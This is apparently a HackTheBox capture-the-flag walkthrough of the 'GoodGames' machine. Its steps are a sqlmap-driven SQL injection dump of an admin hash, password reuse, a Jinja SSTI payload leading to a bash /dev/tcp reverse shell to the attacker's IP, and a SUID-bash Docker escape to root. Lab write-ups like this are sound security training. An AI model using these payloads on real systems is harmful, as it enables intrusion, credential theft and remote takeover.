GoodGames IP: 10.10.11.130


rustscan:
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack



nmap:


PORT   STATE SERVICE  REASON  VERSION
80/tcp open  ssl/http syn-ack Werkzeug/2.0.2 Python/3.9.2
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD POST
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store



navigating to the site on port 80, we see a login point. We capture a request to login in order to check for sql injection using sqlmap


we first check to see if the are injectable parameters:

sqlmap -r login.req --batch                               
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.12#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:34:59 /2023-02-14/

[07:34:59] [INFO] parsing HTTP request from 'login.req'
[07:34:59] [INFO] testing connection to the target URL
[07:35:00] [INFO] checking if the target is protected by some kind of WAF/IPS
[07:35:00] [INFO] testing if the target URL content is stable
[07:35:00] [INFO] target URL content is stable
[07:35:00] [INFO] testing if POST parameter 'email' is dynamic
[07:35:00] [WARNING] POST parameter 'email' does not appear to be dynamic
[07:35:00] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable
[07:35:01] [INFO] testing for SQL injection on POST parameter 'email'
[07:35:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:35:02] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[07:35:02] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[07:35:02] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[07:35:02] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[07:35:03] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[07:35:03] [INFO] testing 'Generic inline queries'
[07:35:03] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[07:35:03] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[07:35:04] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[07:35:04] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[07:35:14] [INFO] POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[07:35:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[07:35:14] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[07:35:15] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[07:35:15] [INFO] target URL appears to have 4 columns in query
got a refresh intent (redirect like response common to login pages) to '/profile'. Do you want to apply it from now on? [Y/n] Y
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[07:35:19] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[07:35:21] [INFO] target URL appears to be UNION injectable with 4 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[07:35:25] [INFO] checking if the injection point on POST parameter 'email' is a false positive
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 148 HTTP(s) requests:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 4799 FROM (SELECT(SLEEP(5)))GPto) AND 'sfYN'='sfYN&password=test
---
[07:35:41] [INFO] the back-end DBMS is MySQL
[07:35:41] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
back-end DBMS: MySQL >= 5.0.12
[07:35:41] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/goodgames.htb'

[*] ending @ 07:35:41 /2023-02-14/


now that we found injectable parameters, we wil check the names of the dbs

                                                                                                                                                                                                
┌──(kali㉿kali)-[~/Practice/HackTheBox/GoodGanes]
└─$ sqlmap -r login.req --batch --dbs
        ___
       __H__                                                                                                                                                                                       
 ___ ___[)]_____ ___ ___  {1.6.12#stable}                                                                                                                                                          
|_ -| . [']     | .'| . |                                                                                                                                                                          
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:36:18 /2023-02-14/

[07:36:18] [INFO] parsing HTTP request from 'login.req'
[07:36:18] [INFO] resuming back-end DBMS 'mysql' 
[07:36:18] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 4799 FROM (SELECT(SLEEP(5)))GPto) AND 'sfYN'='sfYN&password=test
---
[07:36:18] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[07:36:18] [INFO] fetching database names
[07:36:18] [INFO] fetching number of databases
[07:36:18] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                    
[07:36:21] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
2
[07:36:32] [INFO] retrieved: 
[07:36:37] [INFO] adjusting time delay to 1 second due to good response times
information_schema
[07:37:47] [INFO] retrieved: main
available databases [2]:
[*] information_schema
[*] main

[07:38:01] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/goodgames.htb'

[*] ending @ 07:38:01 /2023-02-14/


We now have the names of the dbs, and were gone use main db and search for tables:

┌──(kali㉿kali)-[~/Practice/HackTheBox/GoodGanes]
└─$ sqlmap -r login.req --batch -D main --tables
        ___
       __H__                                                                                                                                                                                       
 ___ ___[(]_____ ___ ___  {1.6.12#stable}                                                                                                                                                          
|_ -| . [']     | .'| . |                                                                                                                                                                          
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:38:21 /2023-02-14/

[07:38:21] [INFO] parsing HTTP request from 'login.req'
[07:38:21] [INFO] resuming back-end DBMS 'mysql' 
[07:38:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 4799 FROM (SELECT(SLEEP(5)))GPto) AND 'sfYN'='sfYN&password=test
---
[07:38:21] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[07:38:21] [INFO] fetching tables for database: 'main'
[07:38:21] [INFO] fetching number of tables for database 'main'
[07:38:21] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                    
[07:38:24] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[07:38:39] [INFO] adjusting time delay to 1 second due to good response times
3
[07:38:40] [INFO] retrieved: blog
[07:38:57] [INFO] retrieved: blog_comments
[07:39:43] [INFO] retrieved: user
Database: main
[3 tables]
+---------------+
| user          |
| blog          |
| blog_comments |
+---------------+

[07:39:58] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/goodgames.htb'

[*] ending @ 07:39:58 /2023-02-14/

we will use the user table from main db and dump all of its contents:

┌──(kali㉿kali)-[~/Practice/HackTheBox/GoodGanes]
└─$ sqlmap -r login.req --batch -D main -T user --dump
        ___
       __H__                                                                                                                                                                                       
 ___ ___[)]_____ ___ ___  {1.6.12#stable}                                                                                                                                                          
|_ -| . [(]     | .'| . |                                                                                                                                                                          
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:41:16 /2023-02-14/

[07:41:16] [INFO] parsing HTTP request from 'login.req'
[07:41:16] [INFO] resuming back-end DBMS 'mysql' 
[07:41:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 4799 FROM (SELECT(SLEEP(5)))GPto) AND 'sfYN'='sfYN&password=test
---
[07:41:16] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[07:41:16] [INFO] fetching columns for table 'user' in database 'main'
[07:41:16] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                    
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[07:41:24] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
4
[07:41:25] [INFO] retrieved: 
[07:41:35] [INFO] adjusting time delay to 1 second due to good response times
id
[07:41:41] [INFO] retrieved: email
[07:41:58] [INFO] retrieved: password
[07:42:31] [INFO] retrieved: name
[07:42:45] [INFO] fetching entries for table 'user' in database 'main'
[07:42:45] [INFO] fetching number of entries for table 'user' in database 'main'
[07:42:45] [INFO] retrieved: 1
[07:42:47] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                           
admin@goodgames.htb
[07:44:05] [INFO] retrieved: 1
[07:44:08] [INFO] retrieved: admin
[07:44:25] [INFO] retrieved: 2b22337f218b2d82dfc3b6f77e7cb8ec
[07:46:30] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[07:46:30] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[07:46:30] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[07:46:30] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[07:46:30] [INFO] starting 4 processes 
[07:46:38] [WARNING] no clear password(s) found                                                                                                                                                   
Database: main
Table: user
[1 entry]
+----+-------+---------------------+----------------------------------+
| id | name  | email               | password                         |
+----+-------+---------------------+----------------------------------+
| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+----+-------+---------------------+----------------------------------+

[07:46:38] [INFO] table 'main.`user`' dumped to CSV file '/home/kali/.local/share/sqlmap/output/goodgames.htb/dump/main/user.csv'
[07:46:38] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/goodgames.htb'

[*] ending @ 07:46:38 /2023-02-14/

we use crackstation to crack the hash: superadministrator


we use these credentials to log in to the page: http://goodgames.htb/profile

from here, press on the settings cog, and we are redirected to internal-administration.goodgames.htb. We need to add it to /etc/hosts in order to reach it

Now we are at http://internal-administration.goodgames.htb/login, which is a flask volt login.

It's funny that we can reuse the credentials above: admin / superadministrator

looking over http://internal-administration.goodgames.htb/settings, we find that full name field is vulnerable to stti =-> {{4*4}}


we know that the name field is vulnerable to ssti, but we can have a POC:

{{ namespace.__init__.__globals__.os.popen('id').read() }}


result:

uid=0(root) gid=0(root) groups=0(root) 

so it's running as root

we can change the poc to get a shell


{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"').read() }}


sudo nc -lvnp 443                                 
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.130] 52462
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
root@3a453ab39d3d:/backend# ls
ls
Dockerfile  project  requirements.txt
root@3a453ab39d3d:/backend# 


we gained a shell, but it seems that we aer inside a docker :(

root@3a453ab39d3d:/backend# cd ..   
cd ..
root@3a453ab39d3d:/# ls
ls
backend  boot  etc   lib    media  opt   root  sbin  sys  usr
bin      dev   home  lib64  mnt    proc  run   srv   tmp  var
root@3a453ab39d3d:/# cd home
cd home
root@3a453ab39d3d:/home# ls
ls
augustus
root@3a453ab39d3d:/home# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
root@3a453ab39d3d:/home# 


by checking /etc/passwd we notice that augustus user is not a suer in the docker, so this means that the home directory is mounted from the source machine

we get the user txt by navigating to augustus:

a4d79a7f5ffc4e4107d2026b263c6201


checking the ip of the docker, we can asume the the machine is running on 172.19.0.1




root@3a453ab39d3d:/home/augustus# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 2292  bytes 385221 (376.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1883  bytes 2045963 (1.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0 



  let's try to ping it to see what ports are opened:
  
  root@3a453ab39d3d:/backend# for port in {1..100}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
<19.0.1/$port && echo "$port open"; done 2>/dev/null
22 open
80 open


so we have port 22 running, can we log in as augustus /superadministrator ?

root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
ssh augustus@172.19.0.1
Pseudo-terminal will not be allocated because stdin is not a terminal.
Permission denied, please try again.
Permission denied, please try again.
Permission denied (publickey,password).

we need to stabilise the shell:

root@3a453ab39d3d:/backend# python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
ssh augustus@172.19.0.1
augustus@172.19.0.1's password: superadministrator

Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 14 13:29:17 2023 from 172.19.0.2
augustus@GoodGames:~$ 

good


augustus@GoodGames:~$ hostname -I
hostname -I
10.10.11.130 172.19.0.1 172.17.0.1 dead:beef::250:56ff:feb9:ac91 
augustus@GoodGames:~$ 

we are running on the goodgames machine 

I’ll copy /bin/bash into augustus’ home directory on the host. It’s important to use bash from the host 

augustus@GoodGames:~$ cp /bin/bash .

Then in the container, I’ll change the owner to root, and set the permissions to be SUID:

root@3a453ab39d3d:/home/augustus# ls -l bash 
-rwxr-xr-x 1 1000 1000 1234376 Feb 22 15:25 bash
root@3a453ab39d3d:/home/augustus# chown root:root bash 
root@3a453ab39d3d:/home/augustus# chmod 4777 bash 
root@3a453ab39d3d:/home/augustus# ls -l bash
-rwsrwxrwx 1 root root 1234376 Feb 22 15:25 bash

Back on GoodGames, the changes are reflected:

augustus@GoodGames:~$ ls -l bash 
-rwsrwxrwx 1 root root 1234376 Feb 22 15:25 bash

Running it (with -p so that privileges aren’t dropped) returns a root shell:

augustus@GoodGames:~$ ./bash -p
bash-5.1# 

bash-5.1# cat /root/root.txt
cat /root/root.txt
3203027e40e531b5325b3c6310624881
bash-5.1# 


     